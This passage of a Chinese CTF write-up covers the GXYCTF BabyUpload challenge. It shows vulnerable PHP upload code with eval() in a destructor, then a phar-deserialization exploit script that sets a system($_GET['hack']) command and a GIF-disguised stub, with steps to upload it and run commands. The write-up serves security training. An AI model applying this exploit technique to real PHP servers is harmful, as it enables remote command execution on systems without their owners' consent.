+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$sandbox</span> = <span class="title function_ invoke__">getcwd</span>().<span class="string">&quot;/uploads/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		<span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="variable">$ext</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="variable">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="variable language_">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token != <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$uploader</span> = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line">	<span class="variable">$uploader</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploader</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到在__destruct中有eval函数，所以我们应该围绕这个eval中的cmd进行解题，既然要让cmd可控那就必须通过上面对token的验证，所以我们应该让token等于会话中的user，而如果我们不自己传递name的值，则Filename的值中会包含SESSION[′user′]中，而如果用户不自己传递name的值，则Filename的值中会包含_SESSION[‘user’]，所以我们不传递name值，随便上传一个文件去获取到session中的user值</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241124110139796.png" alt="image-20241124110139796"></p>
+<p>txt前面的就是我们的session中user的值了，那我们就直接构造exp</p>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$Filename</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">		<span class="comment">//public $cmd =&#x27;echo phpinfo();&#x27;;//可先用此测试</span></span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$cmd</span> =<span class="string">&#x27;echo system($_GET[&quot;hack&quot;]);&#x27;</span>;<span class="comment">//传递一个可控hack参数</span></span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$token</span> =<span class="string">&#x27;GXYc5eda5d2bd6b7220ae12068a537ac4e5&#x27;</span>;<span class="comment">//先上串一个合法文件得到session[&#x27;user&#x27;]</span></span><br><span class="line">		</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;demo.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;demo.phar&quot;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF8a&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span>    = <span class="keyword">new</span> <span class="title class_">Uploader</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;text.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在本地运行生成phar文件并上传</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241124111430609.png" alt="image-20241124111430609"></p>
+<p>拿到路径后用bp抓包进行传参</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241124111640722.png" alt="image-20241124111640722"></p>
+<p>对hack进行传入命令执行就可以了</p>
+<p><img src="/./../image/achieve/202411/GXYCTF/image-20241124111734874.png" alt="image-20241124111734874"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E8%B5%9B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">0x02赛题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">2.1.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">绕过空格过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.2.</span> <span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87flag%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.3.</span> <span class="toc-text">其他绕过flag方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabyUpload"><span class="toc-number">2.2.</span> <span class="toc-text">[GXYCTF2019]BabyUpload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabySQli"><span class="toc-number">2.3.</span> <span class="toc-text">[GXYCTF2019]BabySQli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E7%89%B9%E6%80%A7-%E5%9C%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E5%B9%B6%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E6%97%B6%EF%BC%8C%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E5%B0%B1%E4%BC%9A%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E8%99%9A%E6%8B%9F%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">2.3.1.</span> <span class="toc-text">sql特性:在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83"><span class="toc-number">2.4.</span> <span class="toc-text">[GXYCTF2019]禁止套娃</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-%E5%87%BD%E6%95%B0%E5%B5%8C%E5%A5%97%E5%AE%9E%E7%8E%B0%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="toc-number">2.4.1.</span> <span class="toc-text">解题思路:函数嵌套实现无参数rce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload1-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">payload1:读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload2-%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">payload2:数组操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload3%EF%BC%9Asession-id"><span class="toc-number">2.4.1.3.</span> <span class="toc-text">payload3：session_id</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-StrongestMind"><span class="toc-number">2.5.</span> <span class="toc-text">[GXYCTF2019]StrongestMind</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%87%8F%E6%B3%95%E8%AE%A1%E7%AE%97%E8%84%9A%E6%9C%AC"><span class="toc-number">2.5.1.</span> <span class="toc-text">加减法计算脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GXYCTF2019-BabysqliV3-0"><span class="toc-number">2.6.</span> <span class="toc-text">[GXYCTF2019]BabysqliV3.0</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=GXYCTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=GXYCTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=GXYCTF&body=Check out this article: https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=GXYCTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=GXYCTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/11/12/GXYCTF(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=GXYCTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
